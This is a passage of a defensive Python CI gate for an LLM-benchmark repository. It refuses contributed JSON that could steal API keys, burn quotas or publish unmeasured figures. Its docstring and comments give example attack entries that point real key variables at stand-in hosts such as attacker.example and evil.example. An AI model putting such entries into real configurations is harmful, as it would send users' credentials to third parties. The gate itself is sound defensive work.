#!/usr/bin/env python3
"""Refuse a contribution that could turn this benchmark into a credential harvester, a quota burner,
or a publisher of numbers nobody measured.

Run on every pull request. Exit 0 clean, 1 something must be fixed, 2 the gate could not run.

    python bench/gate_contributions.py

WHY THIS EXISTS, stated plainly because it is the sharpest edge in the repo:

`benchmark.py` reads BOTH the endpoint URL and the environment variable holding the API key out of
`providers.json`, and CONTRIBUTING.md invites strangers to add providers by editing exactly that file.
So a pull request adding

    {"name": "fastllm", "url": "https://attacker.example/v1/chat/completions", "key_env": "GROQ_API_KEY"}

would make everyone who runs the battery send their real Groq key, in an Authorization header, to a
server the contributor controls. The PR would look like a helpful addition. That is the whole attack,
and it needs no exploit, just a merge.

The rule that stops it: **an API key is bound to one host, forever.** A key variable that already
appears in this file may never appear again pointing somewhere else, and a new provider may not claim
an existing project's key variable. Both checks are below, and both fail loudly.

THE SECOND EDGE is quieter and was found by planting pull requests against the first version of this
gate: a JSON-only change that steals nothing can still spend every runner's free quota, get every
runner's account closed, redirect the whole battery to a paid model, bury a live endpoint with a
public headstone, or put a phishing link into a generated table. So every file the runners and the
ranking READ is checked here for shape, range and evidence, not only for where a key is sent:

    providers.json          where keys go, what is sent, how hard the runner may hit an endpoint
    judges.json             the jury; a judge's key is a paid credential and never a provider's
    key_bindings.json       which host each key variable may reach, written down so a pull request
                            cannot move a credential as a side effect of the change it makes
    limits.json             the quotas the ranking is built from, and how each one is known
    privacy.json            claims a reader may act on with customer data
    languages/*.json        the prompts and the generation parameters sent to every provider
    announced_deaths.json   rendered raw into GRAVEYARD.md
    data/uptime.jsonl       decides burials; a planted row can kill a live provider
    data/throughput.jsonl   the headline "tokens a minute" on the front page
    data/drawn.jsonl        the largest single figure on the front-page bar, times 24
    data/reliability.json   the archived answered rates and the reasoning-trap table on RESULTS.md
                            and the README, recomputed here from results/*/raw.json

THE THIRD EDGE was found by a second round of planted pull requests against the second version: every
file the ranking reads has to be opened by this gate, and every figure in it has to be typed and bounded
by what the program that wrote it could have written. One row appended to data/drawn.jsonl put
24,000,000,000 tokens a day on the headline with every check green, because no check opened the file.
Any file bench/rank.py reads and this gate does not open is that same hole again, so the CLEAN line
below names every file it opened: a new data file that is missing from that line is missing from
the gate.

THE FOURTH EDGE was a review that planted numbers UNDER every ceiling. The daily ceilings were ten
times the project's whole target, so one typed 9,900,000,000 tokens a day put 990% on the front page
with every check green; fourteen down rows dated before the endpoint's own last reading buried a live
endpoint, and the test asserted that shape must pass; a burst row's request count was bounded by
nothing, so 20,000 answers in thirty seconds carried fourteen million tokens; and data/reliability.json
was read by rank.py and opened by no gate. So now:

    - no figure that can reach the daily shelf (tpd, rpd x tokens a reply, derived.output_tokens_per_day,
      a Neuron allowance divided by a unit price, one_time.tokens, measured_values.*) may exceed
      bench/rank.py's TARGET_TOKENS_PER_DAY, read from rank.py so the two cannot drift; and above
      DAILY_NEEDS_MEASUREMENT_ABOVE a daily figure is admitted only as MEASURED with measured_how;
    - the three meters append in date order, so a row dated before the newest date already on file is
      back-dated and refused; data/uptime.jsonl and data/drawn.jsonl hold one reading per endpoint-day;
    - a burst row holds no more requests than its slots could have completed in its seconds;
    - data/reliability.json is recomputed from results/*/raw.json and providers.json, count by count;
    - a retirement notice sits on the operator's own domain or on a declared news host; a judge may
      not share a family with a benchmarked model; a one-time grant is under the target; a probe prompt
      may name no domain of any kind and no provider on file; and a provider may not declare every
      generation parameter unsupported.

WHAT A REGEX GATE CANNOT DECIDE, stated so the human review CODEOWNERS asks for knows what it carries:

    1. A negation that negates the opposite claim. privacy.json answers "no" to "trains on your
       prompts" and quotes "Users cannot opt out; we train on all inputs." The quote contains a
       negation, so the rule is satisfied, and the sentence says the opposite of the answer. Only a
       reader can tell what a negation negates.
    2. An open redirect on the provider's own domain. A sign-up link on the provider's registrable
       domain passes the door rule, and a `?next=` parameter on that page can still send a reader
       elsewhere. Whether a parameter redirects is a property of the provider's server, not of the URL.
    3. A retirement notice under a lookalike of a live provider's name. Since this version, a name in
       announced_deaths.json may contain ASCII letters, digits, spaces and a little punctuation only, so
       a homoglyph from another alphabet is refused by rule, and a live provider's name as a whole word
       inside the headstone ("Kenari AI") is refused too. A plain misspelling of a live name still
       passes, and only a reader recognises it.
    4. An archived run rewritten consistently. data/reliability.json is recomputed from results/*/raw.json
       here, so an edit to the archive alone is refused; an edit to raw.json AND the archive that agree
       with each other is a forged run, and only the person who ran it knows.

Every rule here has a planted pull request in bench/test_contributions.py that it must refuse, and an
honest one it must admit. A rule without both is not in this file.
"""
import argparse, json, re, sys
from datetime import date, datetime, timezone
from pathlib import Path
from urllib.parse import urlparse

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from http_safe import written_port     # the port rule, from the file that applies it to redirects  # noqa: E402

REGISTRY = "key_bindings.json"

# Some providers legitimately name their key after the product, not the company, and host their sign-up
# on a different domain than their API. Those pairs are declared HERE, IN CODE, on purpose: adding one
# means editing this gate in the same pull request, where a reviewer sees it. A contributor cannot
# quietly claim someone else's key variable by writing JSON alone.
KNOWN_KEY_ALIASES = {
    "google": {"GEMINI_API_KEY"},        # Google AI Studio issues keys branded Gemini
    "cloudflare": {"CF_API_TOKEN"},      # Cloudflare's own docs and dashboard use CF_
}
# The only hosts this benchmark will ever send an API key to. In code, not in data: a JSON-only pull
# request cannot add a destination. Adding one is an edit to this file, visible in review.
# benchmark.py imports this and refuses to call anything else, so the check runs at request time too,
# not only in CI.
ALLOWED_HOSTS = {
    "generativelanguage.googleapis.com",
    "api.cerebras.ai",
    "api.groq.com",
    "openrouter.ai",
    "api.cloudflare.com",
    "integrate.api.nvidia.com",
    "ollama.com",
    "dashscope-intl.aliyuncs.com",
    "api.xkiro.com",
    "api.siliconflow.com",
    "api.mistral.ai",        # free tier that switches itself on and off: see bench/limits.json
    "api.unorouter.com",     # 163 models marked :free, measured answering 2026-09-07
    "inference.hetzner.com", # free while experimental, their words; 4M input tokens/minute
    "kenari.id",             # 13 models marked :free, measured answering 2026-09-07
    "aihubmix.com",          # 54 models marked -free, measured answering 2026-09-07
    "model.inferx.net",      # free inference, measured answering 2026-09-07
    "hermes.ai.unturf.com",  # keyless: measured answering with no Authorization header, 2026-09-07
    "oai.endpoints.kepler.ai.cloud.ovh.net",  # keyless, anonymous tier: measured 2026-09-07
    "api.z.ai",              # judge, not a benchmarked provider: see bench/judges.json
}
# Hosts that sit in ALLOWED_HOSTS only because a JUDGE lives there. A judge's key is the paid credential
# in this house, so a provider entry on one of these hosts - whatever key_env it names - would spend the
# jury's plan on the battery, the daily radar and the throughput test, and rank a paid endpoint as free.
JUDGE_ONLY_HOSTS = {"api.z.ai"}

# The only environment variables allowed to be interpolated into a URL. Anything else would let a
# contributed URL like https://evil.example/{OPENROUTER_API_KEY}/ exfiltrate a second key in the path.
ALLOWED_URL_PLACEHOLDERS = {"CF_ACCOUNT_ID"}
# ...and each placeholder belongs to ONE host. The runner substitutes the account id into the URL of
# whichever provider carries the placeholder, so a groq URL with {CF_ACCOUNT_ID} in it would send the
# Cloudflare account id to groq, in plain text, in the path.
PLACEHOLDER_HOSTS = {"CF_ACCOUNT_ID": {"api.cloudflare.com"}}

# The one path shape the runners speak. providers.json is a list of OpenAI-compatible chat endpoints and
# nothing else; a path swap on an allowed host (/audio/transcriptions, /embeddings, /files) would still
# carry the key, still be inside the allowlist, and bill every runner for a call the table never shows.
ENDPOINT_PATH = "/chat/completions"

KNOWN_SIGNUP_HOSTS = {
    # provider: hosts where you legitimately obtain a key, when it differs from the API host
    "google": {"google.com"},            # aistudio.google.com issues keys for generativelanguage.googleapis.com
    "alibaba": {"alibabacloud.com"},     # the Model Studio console issues keys for dashscope-intl
    "nvidia": {"nvidia.com"},
    "openrouter": {"openrouter.ai"},
    "xkiro": {"xkiro.com"},
    "siliconflow": {"siliconflow.com"},
    "cerebras": {"cerebras.ai"},
    "groq": {"groq.com"},
    "ollama": {"ollama.com"},
    "cloudflare": {"cloudflare.com"},
}
# Hosts where a provider publishes its TERMS or its LIMITS when that is neither the API domain nor the
# sign-up domain. Every `source` in privacy.json and in limits.json must sit on one of the three, so a
# "does not train on your prompts" or a "10,000,000,000 tokens a day, DECLARED" cannot be backed by a
# page on a domain the provider does not own - a paste site is somebody's summary, not their page.
# Same discipline as the sign-up map: adding a domain is an edit here, in review, never a JSON-only
# change. Every other provider on file documents on its API domain or its sign-up domain.
KNOWN_TERMS_HOSTS = {
    "ovhcloud": {"ovhcloud.com"},        # docs.ovhcloud.com documents the endpoints served from ovh.net
    "google": {"google.dev"},            # ai.google.dev carries the Gemini API terms AND its rate-limit page
}
# Where a retirement notice may sit, by who wrote it. An OPERATOR's notice sits on the operator's own
# domain, declared here per headstone (lowercased name -> registrable domains); a THIRD PARTY's notice
# sits on one of a few news hosts declared here. Anything else - a paste site, a blog nobody can tie to
# the operator - is somebody's summary of a death, not the notice, and a headstone on GRAVEYARD.md is
# the strongest claim this repo makes about a provider. Same discipline as the other host maps: adding
# a domain is an edit here, in review, never a JSON-only change.
KNOWN_OPERATOR_HOSTS = {
    "github models": {"github.blog"},    # the retirement notice is on GitHub's changelog blog
}
KNOWN_NEWS_HOSTS = {"rushcommerce.dev"}  # reported Meta's Llama API retirement, read 2026-09-07
NOTICE_AUTHORS = ("operator", "third party")

# Hosts that are not credential destinations, whatever a contributor writes.
FORBIDDEN_HOST = re.compile(
    r"^(localhost|127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|\[?::1\]?|.*\.local)$|^\d+\.\d+\.\d+\.\d+$",
    re.I)

# --- shapes and ranges. Every one of these is a number somebody planted the wrong side of.
NAME_OK = re.compile(r"^[a-z0-9][a-z0-9_-]{2,31}$")       # rendered into tables and used as a map key
KEY_ENV_OK = re.compile(r"^[A-Z][A-Z0-9_]{2,60}$")
# A provider's key variable is <NAME>_API_KEY or <NAME>_API_TOKEN, and nothing else, unless a pair is
# declared in KNOWN_KEY_ALIASES. The first version asked only that three characters of the name appear
# somewhere in the variable, so a provider called "api" owned GROQ_API_KEY on the groq host and became a
# second row on the same account with no finding. Now the name is at least four characters, is not a
# word every key variable contains, and is EQUAL to the variable's prefix.
MIN_NAME_STEM = 4
GENERIC_NAMES = {"api", "key", "token", "free", "llm", "chat", "model"}
KEY_ENV_SHAPE = re.compile(r"^(?P<stem>[A-Z][A-Z0-9_]*?)_API_(?:KEY|TOKEN)$")
# Model ids are rendered inside backticks in markdown tables by rank.py, so a backtick, a pipe or a
# bracket in one becomes a live link on a generated page. This is bench/refresh_catalog.py's ID_OK,
# the guard it applies to third-party catalogue ids, widened by exactly two characters that the
# providers we benchmark use and OpenRouter's catalogue does not: a leading "@" (Cloudflare's
# "@cf/..." ids) and an inner "_" (OVHcloud's "Meta-Llama-3_3-..."). test_contributions.py pins the
# two patterns to that single declared difference, so neither can drift from the other unnoticed.
MODEL_ID_OK = re.compile(r"^[A-Za-z0-9~@][A-Za-z0-9._/:~+_-]{0,119}$")
MAX_MODELS_PER_PROVIDER = 12
# extra_body is merged into the request AFTER model, messages and max_tokens, so any of these keys in
# it silently replaces what the runner meant to send: a different model billed to every runner's key,
# a different prompt, n completions per call, a stream nobody reads, tools nobody declared. They get
# their own message because a reviewer should see WHICH rewrite was attempted...
FORBIDDEN_EXTRA_BODY = {"model", "messages", "max_tokens", "max_completion_tokens", "n", "stream",
                        "tools", "tool_choice", "response_format", "user"}
# ...but the rule is an ALLOWLIST, not that denylist. The denylist alone admitted a reasoning budget of
# 100,000 tokens billed outside max_tokens on several providers, an alternative output cap of a
# billion under another name, and a `stop: "."` on another provider's model that truncated every reply
# at the first full stop and collapsed its answered rate. Only the reasoning switches the runner
# documents may travel in extra_body, each in its exact shape; a generation parameter belongs in the
# language pack, where it applies to every model alike, and is refused here.
ALLOWED_EXTRA_BODY = {
    "reasoning_effort": "one of low, medium, high",
    "enable_thinking": "true or false",
    "chat_template_kwargs": "an object holding enable_thinking: true or false, and nothing else",
    "thinking": "an object holding type: disabled or enabled, and nothing else - no budget_tokens",
}
REASONING_EFFORTS = {"low", "medium", "high"}
THINKING_TYPES = {"disabled", "enabled"}
EXTRA_BODY_REFUSED = "only the documented reasoning switches may travel in extra_body"
# A timeout under five seconds is a burial, not a setting: the radar's own default is 45 s, and the
# slowest live endpoints we track take 25 to 55 s per call. 0.001 makes every probe record "down".
TIMEOUT_SECONDS = (5, 180)
PAUSE_SECONDS = (0.5, 600)       # 0 hammers a free tier; an hour sleeps the runner into a timeout
MAX_TOKENS = (16, 8000)          # 10**9 spends a day's quota in one call
GENERATION = {                   # languages/*.json may send only these, in these ranges
    "temperature": (0, 2), "top_p": (0, 1), "seed": (0, 2 ** 31 - 1),
    "presence_penalty": (-2, 2), "frequency_penalty": (-2, 2),
}
PROBE_KINDS = {"arithmetic", "diacritics_rewrite", "constrained_rewrite", "json_extraction", "paragraph"}
MAX_PROMPT_CHARS = 2000
# A probe prompt is sent to every provider and echoed into published results. A domain in it, with or
# without a scheme, is a link in a public file; a vendor's name in it is a bias in a measurement. The
# domain shape is ANY dotted name ending in two or more letters, not a list of top-level domains: the
# list had no .ly, .site, .top or .link, and bit.ly/free-keys walked through it. Every provider on
# file is a vendor too, by its name in providers.json and by the stems of the hosts declared for it
# above; the previous list held the host stem "aliyuncs" and let "Alibaba" through.
BARE_DOMAIN = re.compile(
    r"(?<![\w@/.-])(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}(?![\w-])", re.I)
BRAND_WORDS = {"openai", "chatgpt", "anthropic", "claude", "gemini", "gemma", "deepseek", "llama",
               "qwen", "minimax", "kimi", "google", "microsoft", "copilot", "amazon", "bedrock",
               "huggingface"}
MIN_BRAND_STEM = 4


def host_stem(host):
    """The name in a host: api.groq.com -> groq, something.co.uk -> something."""
    parts = host.split(".")
    if len(parts) >= 3 and len(parts[-1]) == 2 and parts[-2] in {"co", "com", "net", "org", "ac"}:
        return parts[-3]
    return parts[-2] if len(parts) >= 2 else host


for _h in ALLOWED_HOSTS:
    if len(host_stem(_h)) >= MIN_BRAND_STEM:
        BRAND_WORDS.add(host_stem(_h))
for _m in (KNOWN_SIGNUP_HOSTS, KNOWN_TERMS_HOSTS):
    for _hosts in _m.values():
        for _h in _hosts:
            if len(host_stem(_h)) >= MIN_BRAND_STEM:
                BRAND_WORDS.add(host_stem(_h))


def brand_re(providers=None):
    """The vendor words a probe prompt may not contain: the fixed list, the stems of every host this gate
    declares, and the name of every provider in providers.json - the parties the probe measures."""
    words = set(BRAND_WORDS)
    for p in providers or []:
        name = p.get("name") if isinstance(p, dict) else None
        if isinstance(name, str) and len(name) >= MIN_BRAND_STEM:
            words.add(name.lower())
    return re.compile(r"\b(%s)\b" % "|".join(sorted(re.escape(w) for w in words)), re.I)


BRAND_RE = brand_re()

CONFIDENCE = ("MEASURED", "DECLARED", "UNKNOWN")
# Every quota figure the ranking or the runners read, with a ceiling past which a "free tier" is a typo
# or a plant. The largest genuine figure in the file is 5,000,000 tokens a minute. The two DAILY keys
# carry None here: their ceiling is the project's own target, read from bench/rank.py by
# daily_ceilings() below, because the previous ceilings (tpd 10**10, rpd 10**7) were ten times the
# target and one typed figure under them put 990% of it on the front page with every check green.
LIMIT_KEYS = {"rpm": 100000, "rps": 1000, "rph": 1000000, "rpd": None,
              "tpm": 10 ** 9, "tpm_input": 10 ** 9, "tpm_output": 10 ** 9, "tpd": None,
              "neurons_per_day": 10 ** 9, "concurrent_requests": 1000}
DAILY_KEYS = ("tpd", "rpd")
PER_MINUTE_KEYS = {"rpm", "rps", "rph", "tpm", "tpm_input", "tpm_output"}
# A daily figure above this is admitted only as MEASURED, with measured_how saying which header,
# endpoint or usage call showed it. The largest measured allowance on file is 5,000,000 a day; a typed
# hundred million would be a tenth of the whole target on one provider's word.
DAILY_NEEDS_MEASUREMENT_ABOVE = 10 ** 8
# The other figures bench/rank.py can turn into a daily number, each of which the second version of
# this gate left untyped: `derived.output_tokens_per_day` goes straight onto the DERIVED shelf, and
# `free_allocation.neurons_per_day / neuron_cost_examples.<model>.output_per_million x 1,000,000` is
# a division whose result was 10**16 with a fractional cost of 0.000001. A grant in tokens or money
# is shown, never summed, but a shown 10**15 is still a lie on the page. Their ceiling in tokens is
# the target too (daily_ceilings()["figure"] and ["tokens"]); money keeps a ceiling of its own.
GRANT_CEILINGS = {"tokens": None, "credits_usd": 10 ** 4, "usd_per_month": 10 ** 4, "usd": 10 ** 4}
NEURON_COST_CEILING = 10 ** 7             # Neurons per million tokens; the largest on file is 204,805
TYPED_BLOCKS = ("free_allocation", "measured_values", "authenticated_tier", "unverified_accounts")
BLOCK_TEXT_KEYS = {"kind", "why", "applies_to", "confidence", "note", "measured_on", "read_on", "source", "how"}
# Free text from limits.json that bench/rank.py renders raw onto LIMITS.md, RESULTS.md and ranking.json,
# and from announced_deaths.json that gate_viability.py renders raw onto GRAVEYARD.md. A caveat reading
# "[our mirror](https://evil.example/keys)" reached three generated pages with every gate green.
TEXT_FIELDS = {"caveat", "note", "tpm_note", "binding_limit", "measured_how", "quote", "expires",
               "expires_quote", "scope_quote", "how", "applies_to", "why", "kind", "unlock", "concurrency",
               "measured_on_tier"}
TPM_SCOPES = {"in+out", "output", "unspecified"}   # what a bare tpm counts; the pages print it next to the figure
TEXT_LIST_FIELDS = {"quotes", "rate_limit_quotes"}
# A headstone's name becomes a heading. ASCII letters, digits, spaces, hyphens, periods and parentheses
# only, so a lookalike letter from another alphabet cannot bury a live provider under a homoglyph.
DEATH_NAME_OK = re.compile(r"^[A-Za-z0-9][A-Za-z0-9 .()\-]{0,62}[A-Za-z0-9)]$")

# The radar's vocabulary, from bench/probe_alive.py, with the HTTP code each state is written with.
# gate_viability.py buries on `down` and rank.py penalises on `down`, `overloaded` and `empty`, so a
# row whose state disagrees with its own status code is a verdict nobody measured.
STATE_HTTP = {"alive": {200}, "empty": {200}, "rate_limited": {429}, "overloaded": {503},
              "payment_required": {402}, "blocked": {401, 403, 406, 451}, "no_key": {None}}
UPTIME_STATES = set(STATE_HTTP) | {"down"}
# The fields bench/throughput.py writes on a measured row. Two are optional: `first_error` was added
# after the first rows were written, and `tokens_estimated` says whether the count came from the
# provider's usage block or from words x 1.3 - rows written from THROUGHPUT_ESTIMATED_FLAG_SINCE on
# must carry it; an older row without it is read as false, their count.
THROUGHPUT_FIELDS = ("provider", "model", "concurrency", "seconds", "requests_ok",
                     "requests_rate_limited", "requests_failed", "output_tokens",
                     "tokens_per_minute_measured", "rate_basis", "stopped_because", "note", "date")
THROUGHPUT_OPTIONAL_FIELDS = ("first_error", "tokens_estimated")
THROUGHPUT_ESTIMATED_FLAG_SINCE = date(2026, 9, 8)
MIN_WINDOW_SECONDS = 10          # bench/throughput.py states no rate under this
RATE_TOLERANCE = 0.03            # seconds are rounded to a tenth in the row; 3% covers that
# A burst slot completes one request at a time, and no endpoint answers a slot more than this many
# times a second: a round trip to a remote model is a tenth of a second at the very least. So a row
# holds at most concurrency x (seconds x this + 1) requests, the +1 being the wave in flight when the
# window opened. The fastest real row is 461 refusals in 30.8 seconds on 8 slots, under 2 a second a
# slot; 20,000 answers in the same window carried fourteen million tokens past the token bound, because
# that bound scales with the request count this one caps.
MAX_REQUESTS_PER_SLOT_SECOND = 10
# The radar's states that are not a reading of the endpoint, from bench/states.py: a second row for an
# endpoint-day in one of them is not a second reading, which is how gate_viability.py counts too.
UPTIME_NOT_A_VERDICT = {"blocked", "no_key"}
# data/reliability.json, as bench/reliability.py writes it: the buckets every call falls into exactly
# once, and the three readings a rate earns. Pinned to reliability.py's source by test_contributions.py.
RELIABILITY_COUNTS = ("ok", "empty_200", "rate_limited", "overloaded", "timeout", "other")
RELIABILITY_READINGS = ((0.95, "answers reliably"),
                        (0.85, "occasionally refuses or returns nothing"),
                        (0.0, "unreliable in our measurements - see the counts"))
PROBE_NAME_OK = re.compile(r"^[A-Za-z0-9_-]{1,8}$")      # rendered in a table cell on RESULTS.md

# A "no" in privacy.json is backed only by a quote that actually negates. Whole words: "Note:" is not
# "not", and "another" is not "no" - both passed the first version of this check.
NEGATION = re.compile(r"\b(?:not|no|never|without|cannot|excluded|opt[ -]out)\b|n't", re.I)


# ---------------------------------------------------------------- helpers

def host_of(url):
    return (urlparse(url).hostname or "").lower()


def registrable(host):
    """Rough eTLD+1. Good enough to tell api.groq.com from attacker.example."""
    parts = host.split(".")
    if len(parts) >= 3 and parts[-2] in {"co", "com", "net", "org", "gov", "ac", "edu"} and len(parts[-1]) == 2:
        return ".".join(parts[-3:])          # something.co.uk
    return ".".join(parts[-2:]) if len(parts) >= 2 else host


def is_int(x):
    return isinstance(x, int) and not isinstance(x, bool)


def is_num(x):
    return isinstance(x, (int, float)) and not isinstance(x, bool)


def is_text(x):
    return isinstance(x, str) and bool(x.strip())


def one_line(x):
    return is_text(x) and "\n" not in x and "\r" not in x


def is_iso_date(x):
    """A calendar date written as YYYY-MM-DD. "yes" is not a date, and neither is 2026-13-40."""
    if not isinstance(x, str) or not re.fullmatch(r"\d{4}-\d{2}-\d{2}", x):
        return False
    try:
        date.fromisoformat(x)
        return True
    except ValueError:
        return False


def is_https_url(x):
    """One https URL, nothing glued on. "https://a.example/x and the console" is prose, not a source."""
    if not isinstance(x, str) or re.search(r"\s", x):
        return False
    u = urlparse(x)
    return u.scheme == "https" and bool(u.hostname)


def today_utc():
    """The gate's clock, in UTC like every date the meters write. Passed in by --today so a run is
    reproducible, and so a test can plant a row dated tomorrow without waiting for tomorrow."""
    return datetime.now(timezone.utc).date()


def after_today(x, today):
    """True for a valid ISO date later than `today`. A measurement dated in the future is a row nobody
    took, and the burial clock in gate_viability.py counts from the LATEST date in the file."""
    return is_iso_date(x) and date.fromisoformat(x) > today


def page_text_problem(value):
    """None when a string may be rendered raw onto a generated page; else what disqualifies it. A URL,
    a markdown link, an angle bracket, a square bracket, a backtick or a second line each becomes
    structure on the page - a link a reader clicks, a tag, a code span, a line that leaves the
    blockquote it was quoted in."""
    if not isinstance(value, str):
        return "must be a string"
    if re.search(r"https?://|www\.", value, re.I):
        return "contains a URL"
    if "](" in value:
        return "contains a markdown link"
    if re.search(r"[<>\[\]`]", value):
        return "contains one of < > [ ] or a backtick"
    if "\n" in value or "\r" in value:
        return "spans more than one line"
    return None


def own_domains(name, api_host):
    """The registrable domains a provider's own evidence may sit on: its API domain, its declared
    sign-up host(s) and its declared terms host(s). One rule for privacy.json and limits.json."""
    return {registrable(api_host)} | KNOWN_SIGNUP_HOSTS.get(name, set()) | KNOWN_TERMS_HOSTS.get(name, set())


def _meters():
    """The two meters whose rows this gate reads, imported when a data check needs them and not at load
    time, because both import ALLOWED_HOSTS from this file. The gate applies THEIR constants and
    predicates rather than a copy: the bound a row is held to is the bound the meter ran under, and
    bench/test_contributions.py pins the two meters to each other where they must agree."""
    if str(HERE) not in sys.path:
        sys.path.insert(0, str(HERE))
    import draw_day, throughput
    return draw_day, throughput


def _rank():
    """bench/rank.py, imported when a limits check needs its target and not at load time: rank.py imports
    this gate's host maps at load, so the import runs the other way round only inside a function."""
    if str(HERE) not in sys.path:
        sys.path.insert(0, str(HERE))
    import rank
    return rank


def daily_ceilings():
    """The ceiling of every figure that can reach the daily shelf, from bench/rank.py's own target so the
    two cannot drift: tpd at the target; rpd at the target divided by the tokens a reply rank.py
    multiplies it by; a grant in tokens and any other daily-shaped figure at the target. A single
    provider's figure above the whole project's target is a typo or a plant, whatever its label."""
    R = _rank()
    target = R.TARGET_TOKENS_PER_DAY
    return {"tpd": target, "rpd": target // R.TOKENS_PER_REPLY, "tokens": target, "figure": target,
            "target": target, "tokens_per_reply": R.TOKENS_PER_REPLY}


def _ceiling(key):
    """The sanity ceiling of one LIMIT_KEYS figure: static for per-minute figures, the target for daily ones."""
    return LIMIT_KEYS[key] if LIMIT_KEYS[key] is not None else daily_ceilings()[key]


def _daily_figure(where, label, tokens, conf, measured_how_ok, problems, unit="tokens a day"):
    """One figure that reaches the daily shelf, held to the two rules: never above the target, and above
    DAILY_NEEDS_MEASUREMENT_ABOVE only as MEASURED with measured_how. `conf` is the label rank.py would
    put on it; `measured_how_ok` says whether the block, or the provider it sits under, carries a method."""
    c = daily_ceilings()
    if tokens > c["target"]:
        problems.append((where, "%s is %s %s, above the whole project's target of %s (bench/rank.py "
                                "TARGET_TOKENS_PER_DAY). No single provider's figure may exceed the target: "
                                "one typed number under a looser ceiling put 990%% of it on the front page "
                                "with every check green." % (label, "{:,}".format(tokens), unit, "{:,}".format(c["target"]))))
    elif tokens > DAILY_NEEDS_MEASUREMENT_ABOVE and not (conf == "MEASURED" and measured_how_ok):
        problems.append((where, "%s is %s %s, above %s, and it is %s. A daily figure that large is admitted only "
                                "as MEASURED, with measured_how saying which header, endpoint or usage call showed "
                                "it: the largest measured allowance on file is 5,000,000, and a typed hundred "
                                "million would be a tenth of the whole target on one provider's word."
                         % (label, "{:,}".format(tokens), unit, "{:,}".format(DAILY_NEEDS_MEASUREMENT_ABOVE),
                            ("MEASURED with no measured_how" if conf == "MEASURED" else str(conf)))))


def _in_date_order(where, label, key, day, ledger, problems, one_per_day, what):
    """The meters append in date order, the whole day at once, so `day` may not be earlier than the newest
    date already on file, for this endpoint or any other: a row filed for a day the meter already passed
    is a measurement nobody took on the day it names. With `one_per_day`, a second row for the same
    endpoint-day is refused too. `ledger` is {"newest": date or None, "by_endpoint": {key: newest date},
    "days": {(key, date)}}, threaded through one file."""
    if not is_iso_date(day):
        return
    d = date.fromisoformat(day)
    newest, own = ledger["newest"], ledger["by_endpoint"].get(key)
    if newest is not None and d < newest:
        problems.append((where, "dated %s, and %s already holds %s dated %s. %s appends one row per endpoint per "
                                "run in date order, so a row filed for a day it already passed is back-dated: a "
                                "measurement nobody took on the day it names. Fourteen of those, dated before the "
                                "endpoint's own last reading, buried a live endpoint with every check green."
                         % (day, label, ("a row for %s %s" % key) if own is not None and own > d else "rows",
                            (own if own is not None and own > d else newest).isoformat(), what)))
    elif one_per_day and (key, d) in ledger["days"]:
        problems.append((where, "a second row for %s %s on %s. A day holds one reading per endpoint: the later "
                                "row replaces the earlier one on the page, and fourteen readings of one day are "
                                "not fourteen days. Keep the reading that stands and move the other to a "
                                "superseded file, archived and not deleted." % (key[0], key[1], day)))
    ledger["newest"] = d if newest is None or d > newest else newest
    ledger["by_endpoint"][key] = d if own is None or d > own else own
    if one_per_day:
        ledger["days"].add((key, d))


def _new_ledger():
    return {"newest": None, "by_endpoint": {}, "days": set()}


class DuplicateKey(ValueError):
    pass


def _refuse_duplicates(pairs):
    out = {}
    for k, v in pairs:
        if k in out:
            raise DuplicateKey(k)
        out[k] = v
    return out


def load_json(path, problems):
    """json.loads keeps the LAST of two identical keys and says nothing, so a reviewer reading the first
    `url` in an object sees a different destination than the runner uses. Refused at every level, for
    every file this gate reads. A syntax error still propagates: that is exit 2, not a finding."""
    try:
        return json.loads(path.read_text(encoding="utf-8"), object_pairs_hook=_refuse_duplicates)
    except DuplicateKey as e:
        problems.append((path.name, "duplicate JSON key %r. The parser keeps the last one silently, so "
                                    "what a reviewer reads and what the runner uses are two different "
                                    "values." % e.args[0]))
        return None


def read_jsonl(path, label, problems):
    """[(line number, row)] for the rows that parse; every row that does not is a finding, because the
    consumers of these files skip a bad line silently and a silent skip is how a measurement vanishes."""
    rows = []
    for n, line in enumerate(path.read_text(encoding="utf-8").split("\n"), 1):
        where = "%s:%d" % (label, n)
        if not line.strip():
            continue
        try:
            row = json.loads(line, object_pairs_hook=_refuse_duplicates)
        except DuplicateKey as e:
            problems.append((where, "duplicate JSON key %r in the row" % e.args[0]))
            continue
        except ValueError as e:
            problems.append((where, "not valid JSON: %s" % str(e)[:60]))
            continue
        if not isinstance(row, dict):
            problems.append((where, "a row must be a JSON object"))
            continue
        rows.append((n, row))
    return rows


def models_of(providers):
    """{name: {model ids}} from a providers list, for the files that reference both."""
    return {p.get("name"): {m.get("id") for m in (p.get("models") or []) if isinstance(m, dict)}
            for p in providers if isinstance(p, dict)}


def hosts_of(providers):
    return {p.get("name"): host_of(p.get("url", "")) for p in providers if isinstance(p, dict)}


# One map for the whole house, not one per file. providers.json and judges.json both hand an API key to
# a host, and they used to be checked by two functions with two private maps - so ZAI_API_KEY, bound to
# api.z.ai as a judge, could be claimed by a contributed PROVIDER pointing anywhere in ALLOWED_HOSTS,
# and neither check would notice. The binding is a property of the key, not of the file it appears in.
def new_bindings():
    """A fresh set of maps for one run. Module-level state would leak between runs and make the
    gate's answer depend on what it checked before, which is how a test file starts passing for the
    wrong reason."""
    return {"key_to_host": {}, "host_to_key": {}, "key_role": {}, "host_role": {}}


def bind_key(where, key_env, host, problems, maps, role):
    """Enforce: one key variable, one host, one ROLE - forever, across every file that names a
    credential. A judge's key is the paid one; it is never a provider's, and a provider's is never
    a judge's, even on the same host."""
    KEY_TO_HOST, HOST_TO_KEY = maps["key_to_host"], maps["host_to_key"]
    prev_host = KEY_TO_HOST.get(key_env)
    if prev_host and registrable(prev_host) != registrable(host):
        problems.append((where,
                         "key_env %s is already bound to %s, and this entry points it at %s. "
                         "An API key belongs to exactly one provider: sending it anywhere else "
                         "hands that provider's credential to a third party."
                         % (key_env, prev_host, host)))
    KEY_TO_HOST.setdefault(key_env, host)

    prev_key = HOST_TO_KEY.get(registrable(host))
    if prev_key and prev_key != key_env:
        problems.append((where, "host %s already uses key_env %s; two key variables for one host "
                                "is how a typo becomes a leak" % (host, prev_key)))
    HOST_TO_KEY.setdefault(registrable(host), key_env)

    prev_role = maps["key_role"].get(key_env)
    if prev_role and prev_role != role:
        problems.append((where, "key_env %s is a %s key and this entry uses it as a %s key. The judge's "
